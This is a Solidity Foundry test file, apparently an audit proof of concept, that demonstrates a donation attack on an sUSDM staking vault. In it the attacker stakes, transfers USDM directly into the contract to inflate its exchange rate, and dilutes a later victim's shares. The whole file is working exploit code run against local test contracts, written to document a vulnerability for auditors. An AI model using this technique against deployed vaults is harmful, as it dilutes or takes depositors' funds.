// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";

// ATTACK TIMELINE:
// 1. [Setup] Attacker deposits and stakes 100,000 USDC to get sUSDM shares via _depositAndStake helper.
// 2. [T=1] Attacker mints 10,000 USDM by pranking the vault (simulating acquired USDM).
// 3. [T=2] Attacker donates 10,000 USDM directly to the sUSDM contract, artificially inflating totalAssets() and the exchange rate.
// 4. [T=3] Victim deposits and stakes 100,000 USDC. Due to the inflated exchange rate, the victim receives significantly fewer sUSDM shares.
// 5. [Assert] Verify that the victim's share balance is strictly less than the attacker's, proving the victim was diluted by the donation.

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        address attacker = address(0xA11CE);
        address victim = address(0xB0B);

        // Step 1: Attacker deposits and stakes to get initial sUSDM shares
        _depositAndStake(attacker, 100_000e6);
        uint256 attackerShares = susdm.balanceOf(attacker);
        console.log("Step 1: Attacker sUSDM shares =", attackerShares);

        // Step 2: Attacker acquires USDM to donate (minted via vault prank for test simplicity)
        uint256 donation = 10_000e6;
        vm.prank(address(vault));
        usdm.mint(attacker, donation);
        console.log("Step 2: Attacker USDM balance for donation =", usdm.balanceOf(attacker));

        // Step 3: Attacker donates USDM directly to sUSDM, inflating totalAssets()
        uint256 assetsBefore = susdm.totalAssets();
        vm.prank(attacker);
        usdm.transfer(address(susdm), donation);
        uint256 assetsAfter = susdm.totalAssets();
        console.log("Step 3: sUSDM totalAssets before donation =", assetsBefore);
        console.log("Step 3: sUSDM totalAssets after donation =", assetsAfter);
        assertEq(assetsAfter, assetsBefore + donation, "totalAssets should increase by exact donation amount");

        // Step 4: Victim deposits and stakes after the exchange rate has been artificially inflated
        _depositAndStake(victim, 100_000e6);
        uint256 victimShares = susdm.balanceOf(victim);
        console.log("Step 4: Victim sUSDM shares =", victimShares);

        // Step 5: Assert the exploit - victim receives fewer shares than attacker for the same underlying deposit
        assertLt(victimShares, attackerShares, "Victim should receive fewer shares due to inflated exchange rate from donation");
    }
}
